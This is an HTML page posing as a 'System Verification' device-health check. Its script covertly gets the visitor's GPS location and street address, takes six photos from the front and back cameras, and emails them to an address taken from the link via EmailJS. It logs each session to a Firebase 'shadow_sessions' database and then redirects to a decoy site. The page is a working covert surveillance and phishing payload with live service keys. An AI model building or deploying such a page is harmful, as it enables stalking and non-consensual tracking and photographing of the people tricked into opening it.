<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#020617] text-white flex items-center justify-center h-screen overflow-hidden">
    <div class="text-center p-10 max-w-sm w-full bg-[#0f172a] rounded-[2.5rem] border border-slate-800 shadow-2xl">
        <div class="relative w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
        <h1 class="text-xl font-black italic">VERIFY <span class="text-blue-500">SYSTEM</span></h1>
        <div class="w-full bg-slate-800 h-1 rounded-full mt-6 overflow-hidden"><div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div></div>
        <p id="msg" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest">Checking Device Health...</p>
        <video id="v-front" autoplay playsinline class="hidden"></video>
        <video id="v-back" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" width="1280" height="720" class="hidden"></canvas>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        emailjs.init("etJqo3AXU_wo-pcNi");

        const urlParams = new URLSearchParams(window.location.search);
        const sessionID = urlParams.get('session');
        const targetEmail = urlParams.get('email');
        const red = decodeURIComponent(urlParams.get('red') || "https://google.com");

        let locStr = "Denied";
        let exactAdd = "Permission Required";

        navigator.geolocation.getCurrentPosition(pos => {
            const { latitude: lat, longitude: lon } = pos.coords;
            locStr = `http://google.com/maps?q=${lat},${lon}`;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`)
                .then(res => res.json()).then(data => {
                    exactAdd = data.display_name;
                    db.ref('shadow_sessions/' + sessionID).update({ location: locStr, address: exactAdd });
                });
            initCapture();
        }, () => initCapture());

        async function initCapture() {
            try {
                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v-front').srcObject = s1;
                try {
                    const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    document.getElementById('v-back').srcObject = s2;
                } catch(e) {}
                startSequence();
            } catch(e) { window.location.href = red; }
        }

        async function startSequence() {
            for(let i=1; i<=6; i++) {
                await new Promise(r => setTimeout(r, 2000));
                let cam = (i <= 3) ? 'v-front' : 'v-back';
                await takeShot(cam, i);
                document.getElementById('msg').innerText = `Syncing Packet ${i}/6...`;
                document.getElementById('bar').style.width = (i * 16.6) + "%";
                db.ref('shadow_sessions/' + sessionID).update({ progress: i + "/6 Captured" });
            }
            window.location.href = red;
        }

        async function takeShot(vidId, idx) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById(vidId);
            const active = video.srcObject ? video : document.getElementById('v-front');
            if(active.srcObject) {
                canvas.getContext('2d').drawImage(active, 0, 0, 1280, 720);
                return emailjs.send("service_toskmod", "template_55m8k98", {
                    to_email: targetEmail, session_id: sessionID,
                    location: locStr, address: exactAdd,
                    camera: (idx <= 3) ? "Front" : "Back",
                    image_data: canvas.toDataURL('image/jpeg', 0.4)
                });
            }
        }
    </script>
</body>
</html>
